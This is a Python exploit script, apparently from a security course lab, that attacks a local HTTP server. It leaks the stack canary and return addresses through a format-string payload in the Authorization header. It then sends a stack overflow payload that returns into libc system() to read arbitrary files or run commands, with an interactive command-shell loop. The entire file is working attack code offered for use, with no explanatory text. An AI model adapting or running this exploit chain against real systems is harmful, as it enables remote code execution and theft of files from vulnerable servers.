import sys
import pycurl
import struct
import base64
import requests

from sys import argv
from io  import BytesIO

colors = {'Red'          : '\033[31m'      ,
          'Green'        : '\033[32m'      ,
          'Yellow'       : '\033[33m'      ,
          'Blue'         : '\033[34m'      ,
          'Purple'       : '\033[35m'      ,

          'Light_Red'    : '\033[91m'      ,
          'Light_Green'  : '\033[92m'      ,
          'Light_Yellow' : '\033[93m'      ,
          'Light_Blue'   : '\033[94m'      ,
          'Light_Purple' : '\033[95m'      ,

          'Bright_Red'   : '\033[1;31m'    ,
          'Bright_Green' : '\033[1;32m'    ,
          'Bright_Yellow': '\033[1;33m'    ,
          'Bright_Blue'  : '\033[1;34m'    ,
          'Bright_Purple': '\033[1;35m'    ,

          'BLight_Red'   : '\033[1;91m'    ,
          'BLight_Green' : '\033[1;92m'    ,
          'BLight_Yellow': '\033[1;93m'    ,
          'BLight_Blue'  : '\033[1;94m'    ,
          'BLight_Purple': '\033[1;95m'    ,

          'White'        : '\033[1;37m'    ,
          'Orange'       : '\033[38;5;214m',
          'Reset'        : '\033[0m'}
          
# ---------------------------------------------------------------------------------------------------- #

def send_headers_request(port, path, header_data, messages=1):

    url = 'http://localhost:' + port + path

    if messages:
        print("\nConnecting to {}{}{}...".format(colors["Light_Green"], url, colors["Reset"]))

    header_data_b64 = base64.b64encode(bytes(header_data, 'utf-8'))
    headers = {'Authorization': 'Basic ' + header_data_b64.decode('UTF-8')}

    if messages:
        print("\nSending request with payload: {}{}{}".format(colors["Bright_Blue"], header_data, colors["Reset"]))

    response = requests.request("GET", url, headers=headers)
        
    return response

# ---------------------------------------------------------------------------------------------------- #

def send_http_request(port, path, header_data, payload, ret2libc=0, timeout=7, messages=1):

    url = 'http://localhost:' + port + path

    if messages:
        print("\nConnecting to {}{}{}...".format(colors["Light_Green"], url, colors["Reset"]))

    header_data_b64 = base64.b64encode(bytes('admin:' + header_data, 'utf-8'))
    headers = {'Authorization': 'Basic ' + header_data_b64.decode('UTF-8')}

    try:
        if messages:
            print("\nSending request...")
        
        response = requests.request("POST", url, headers=headers, data=payload.getvalue(), timeout=timeout)
        
        if messages:
            if ret2libc:
                print("Executing command... ")
            else:
                print("Retrieving Data... ")
    except: 
        if ret2libc:
            print("Command execution failed")
        else:
            print("File not found")
        return None
        
    return response
    
# ---------------------------------------------------------------------------------------------------- #

def build_payload(resp_data, path, ret2libc=0, export_path=None, messages=1):
    
    # Building the payload
    canary   = resp_data[-5]
    ebx      = resp_data[-4]
    ebp      = resp_data[-3]
    auth_ret = resp_data[-2]
    main_ret = resp_data[-1]
    
    if messages:
        print("\nResponse: ")
        print("  -> Canary                = {}{}{}    ".format(colors["Bright_Yellow"]                   , canary   , colors["Reset"]), sep='')
        print("  -> EBX      (check_auth) = {}0x{}{}{}".format(colors["Light_Blue"], colors["Orange"]    , ebx      , colors["Reset"]), sep='')
        print("  -> EBP      (check_auth) = {}0x{}{}{}".format(colors["Light_Blue"], colors["Bright_Red"], ebp      , colors["Reset"]), sep='')
        print("  -> Ret_Addr (check_auth) = {0}0x{1}{2}{3}  <{4}route{3}+{5}114{3}>".format(colors["Light_Blue"] , colors["Orange"], auth_ret, colors["Reset"], colors["Bright_Yellow"], colors["White"]), sep='')
        print("  -> Ret_Addr (main)       = {0}0x{1}{2}{3}  <{4}__libc_start_main{3}+{5}247{3}>".format(colors["Light_Blue"], colors["Bright_Purple"], main_ret, colors["Reset"], colors["Bright_Yellow"], colors["White"]), sep='')

        print("\nCalculating new attack addresses... ", end='')

    offset_to_fin_ret = 0xF4E
    offset_to_system  = 0x22769
    offset_to_path    = 0x90

    canary   = struct.pack('<L', int(canary  , base=16))

    svd_ebx  = struct.pack('<L', int(ebx     , base=16))
    svd_ebp  = struct.pack('<L', int(ebp     , base=16))
    argument = struct.pack('<L', int(ebp     , base=16) - offset_to_path)

    sys_ret  = struct.pack('<L', int(main_ret, base=16) + offset_to_system)
    fin_ret  = struct.pack('<L', int(auth_ret, base=16) + offset_to_fin_ret)

    if messages:
        print("Done\n")
        print("Ret to {0}system{1}    = {2}0x{4}{3}{1}  <{5}system{1}>".format(colors["Bright_Green"], colors["Reset"], colors["Light_Blue"], hex(int(main_ret, base=16) + offset_to_system)[2:] , colors["Bright_Purple"], colors["Bright_Yellow"]), sep='')
        print("Ret to {0}route{1}     = {2}0x{4}{3}{1}  <{5}respond{1}+{6}793{1}>".format(colors["Bright_Green"], colors["Reset"], colors["Light_Blue"], hex(int(auth_ret, base=16) + offset_to_fin_ret)[2:] , colors["Orange"], colors["Bright_Yellow"], colors["White"]), sep='')
        print("Argument address = {}0x{}{}{}".format(colors["Light_Blue"], colors["Bright_Red"], hex(int(ebp, base=16) - offset_to_path)[2:], colors["Reset"]) , sep='')
        print("Given argument   = {}{}{}".format(colors["Orange"], path, colors["Reset"]), sep='')

    if messages:
        print("\nGenerating payload... ", end='')

    binary_payload = BytesIO()

    binary_payload.write(("p" * 100).encode("utf-8"))
    binary_payload.write(canary)
    binary_payload.write(("p" * 4).encode("utf-8"))
    binary_payload.write(svd_ebx)
    binary_payload.write(svd_ebp)
    binary_payload.write(sys_ret)
    binary_payload.write(fin_ret)
    binary_payload.write(argument)
    binary_payload.write(("echo 'HTTP/1.1 200 OK\n';").encode("utf-8"))
    if ret2libc:
        binary_payload.write(("{}&".format(path)).encode("utf-8"))
    else:
        binary_payload.write(("cat {}&".format(path)).encode("utf-8"))

    if messages:
        print("Done")

    if export_path != None:
        if messages:
            print("Exporting payload in {}{}{}...".format(colors["Light_Green"], export_path, colors["Reset"]), end='', sep='')

        try:
            xp = open(export_path, 'wb')
        except:
            print("{}Error:{} Cannot open file {}{}{}".format(colors["Bright_Red"], colors["Reset"], colors["Light_Green"], export_path, colors["Reset"]))
            exit()
        
        xp.write(binary_payload.getvalue())
        xp.close()

        if messages:
            print("Done")
    
    null_free_payload = BytesIO()
    bp_val = binary_payload.getvalue()
    anchor = 0
    for i, byte in enumerate(binary_payload.getvalue()):
        if not byte:
            null_free_payload.write(bp_val[anchor:i])
            null_free_payload.write(("=").encode("utf-8"))
            anchor = i + 1
    
    null_free_payload.write(bp_val[anchor:])
    return null_free_payload

# ---------------------------------------------------------------------------------------------------- #

def perform_attack(port, password, path, ret2libc=0, export_results=None, export_payload=None, timeout=7, messages=1):

    header_payload = '%27$x %29$x %30$x %31$x %111$x'
    
    response  = send_headers_request(port, '/', header_payload, messages=messages)
    resp_data = list(response.headers.items())[0][1].split('user: ')[-1].replace('"' , '').split()

    binary_payload = build_payload(resp_data, path, ret2libc, export_payload, messages)

    response = send_http_request(port, '/ultimate.html', password, binary_payload, ret2libc, timeout, messages)
    
    if response is None:
        exit()
    
    if response.status_code != 200:
        print("\n{}Error:{} Status {}{}{}\n".format(colors["Bright_Red"], colors["Reset"], colors["Light_Green"], response.status_code, colors["Reset"]), sep='')
        exit()

    if messages:
        print("\nCompleted {}Successfully{}".format(colors["Light_Green"], colors["Reset"]))

    if export_results != None:
        try:
            fp = open(export_results, 'wb')
        except:
            print("{}Error:{} Cannot open file {}{}{}".format(colors["Bright_Red"], colors["Reset"], colors["Light_Green"], export_results, colors["Reset"]))
            exit()
        
        if messages:
            print("\nExporting received data in {}{}{}...".format(colors["Orange"], export_results, colors["Reset"]), end='', sep='')
        
        fp.write(response.content)
        fp.close()

        print("Done\n")
    else:
        if messages:
            print("--------------------------------------------------\n")
        
        print(response.text)

# ---------------------------------------------------------------------------------------------------- #

def rev_shell(port, password, timeout=7):

    while True:
        
        try:
            command = input(">> ")
        except:
            print()
            exit()

        export_path = None

        if ">" in command:
            parse_cmd   = command.replace(' ' , '').split('>')
            command     = parse_cmd[0]
            export_path = parse_cmd[1]
        
        elif command == "exit":
            return

        elif command in ["clear", "cl"]:
            print("\033[2J\033[1;1H")
            continue

        elif not command:
            continue

        elif "t=" in command.replace(' ', ''):
            tval = command.replace(' ', '').split('t=')[1]

            if tval.lower() != 'none':
                timeout = float(tval)
                print("Timeout set to: ", timeout)

                if timeout < 0:
                    timeout = 5
            else:
                print("Timeout set to: None")
                tval = None

            continue

        header_payload = '%27$x %29$x %30$x %31$x %111$x'

        response  = send_headers_request(port, '/', header_payload, messages=0)
        resp_data = list(response.headers.items())[0][1].split('user: ')[-1].replace('"' , '').split()

        binary_payload = build_payload(resp_data, command, ret2libc=1, messages=0)

        response = send_http_request(port, '/ultimate.html', password, binary_payload, ret2libc=1, timeout=timeout, messages=0)
        
        if response is None:
            continue

        if export_path != None:

            try:
                fp = open(export_path, 'wb')
            except:
                print("{}Error:{} Cannot open file {}{}{}".format(colors["Bright_Red"], colors["Reset"], colors["Light_Green"], export_path, colors["Reset"]))
                exit()
            
            fp.write(response.content)
            fp.close()

        else:
            print(response.text)

# ---------------------------------------------------------------------------------------------------- #
# ---------------------------------------------------------------------------------------------------- #

if __name__ == "__main__":

    # Change default password
    if '-p' in argv:
        password = argv[argv.index('-p') + 1]
    else:
        password = 'you shall not pass'


    # Change timeout parameter for POST request
    if '-t' in argv:
        if argv[argv.index('-t') + 1] == 'None':
            timeout = None
        else:
            timeout = float(argv[argv.index('-t') + 1])
    else:
        timeout = 5


    # Disable messages
    if '-d' in argv:
        messages = 0
    else:
        messages = 1


    # Enable ret2libc attack
    if '-s' in argv:
        ret2libc = 1
    else:
        ret2libc = 0

    
    # Export results into file
    if '-xd' in argv:
        export_results = argv[argv.index('-xd') + 1]
    else:
        export_results = None


    # Export binary payload into file
    if '-xp' in argv:
        export_payload = argv[argv.index('-xp') + 1]
    else:
        export_payload = None


    # Enable reverse shell
    if '-rs' in argv:
        rev_shell(argv[1], password, timeout)
    else:
        perform_attack(argv[1], password, argv[2], ret2libc, export_results, export_payload, timeout, messages)